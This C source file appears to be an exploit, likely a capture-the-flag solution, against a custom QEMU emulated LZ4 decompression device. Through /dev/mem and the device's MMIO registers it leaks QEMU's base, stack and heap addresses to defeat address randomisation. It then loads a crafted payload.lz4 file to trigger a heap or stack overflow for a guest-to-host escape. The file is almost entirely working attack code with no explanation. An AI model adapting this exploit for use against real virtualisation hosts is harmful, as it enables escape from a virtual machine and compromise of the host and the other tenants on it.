#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

uint32_t mmio_addr = 0x0b000000;
uint32_t mmio_size = 0x1000;

#define LZ4DEV_OFFSET_ID 0x00
#define LZ4DEV_OFFSET_LEN 0x08
#define LZ4DEV_OFFSET_TRIGGER 0x10

char payload1[]={ 0x0f, 0xb8, 0xfa, 0x20};
char payload2[]={ 0x0f, 0x80, 0x00, 0x80};

int main(int argc, char *argv[]){
int fd;
volatile uint64_t val;
volatile void *mmio_base = NULL;
uint64_t qemu_base, stack, heap;

	if ((fd = open( "/dev/mem", O_RDWR )) == -1)  {
		return 0;
	}
	if (!(mmio_base = mmap( NULL, mmio_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, mmio_addr )))  {
		return(0);
	}

	if (argc == 1)
	{
		memcpy(mmio_base+0x20, payload2, 4);
		*(volatile uint64_t *)(mmio_base+LZ4DEV_OFFSET_LEN) = (uint64_t)4;
		*(uint64_t *)(mmio_base+LZ4DEV_OFFSET_TRIGGER) = 0xcaca;
		usleep(100000);
		val = *(volatile uint64_t *)(mmio_base+LZ4DEV_OFFSET_LEN);
		qemu_base = *(volatile uint64_t *)(mmio_base+0x20+0x78) - 0x44a879;
		printf("qemu base = 0x%llx\n", qemu_base);
		stack = *(volatile uint64_t *)(mmio_base+0x20+0x60);
		printf("stack buffer = 0x%llx\n", stack);
		heap = *(volatile uint64_t *)(mmio_base+0x20+0x68);
                printf("heap = 0x%llx\n", heap);
		munmap((void *)mmio_addr, mmio_size);
	}
	else if (argc==2)
	{
		
		FILE *f = fopen("payload.lz4", "rb");
		fseek(f, 0, SEEK_END);
                size_t file_size = ftell(f);
                if (file_size>=2048)
                {
                        puts("Input file too big...");
                        exit(-1);
                }
                rewind(f);
                fread(mmio_base+0x20,1,file_size,f);
                fclose(f);
		/* trigger overflow */
		*(volatile uint64_t *)(mmio_base+LZ4DEV_OFFSET_LEN) = (uint64_t)file_size;
                *(uint64_t *)(mmio_base+LZ4DEV_OFFSET_TRIGGER) = 0xcaca;
	}
}
